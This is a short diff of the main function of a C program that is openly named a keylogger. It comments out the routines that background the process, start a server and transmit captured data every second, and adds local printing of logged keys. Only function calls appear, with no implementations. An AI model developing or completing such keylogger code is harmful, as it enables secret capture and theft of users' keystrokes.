@@ -13,23 +13,15 @@ void background_process(void) {
 }
 
 void main(void) {
-  background_process();
-  begin_keylogger();
-  open_server();
-
-  pid_t my_pid = getpid();
-  while (1) {
-    transmit_data();
-    //printf("%d\n",(int)my_pid);
-    sleep(1);
-  }
-  end_keylogger();
-  close_server();
   // background_process();
   // begin_keylogger();
   // open_server();
+
+  // pid_t my_pid = getpid();
   // while (1) {
   //   transmit_data();
+  //   //printf("%d\n",(int)my_pid);
+  //   sleep(1);
   // }
   // end_keylogger();
   // close_server();
@@ -38,4 +30,5 @@ void main(void) {
   key_package.keys_arr_size = 0;
   log_device(&key_package);
   log_keys(&key_package);
+  print_logged_keys(key_package);
 }
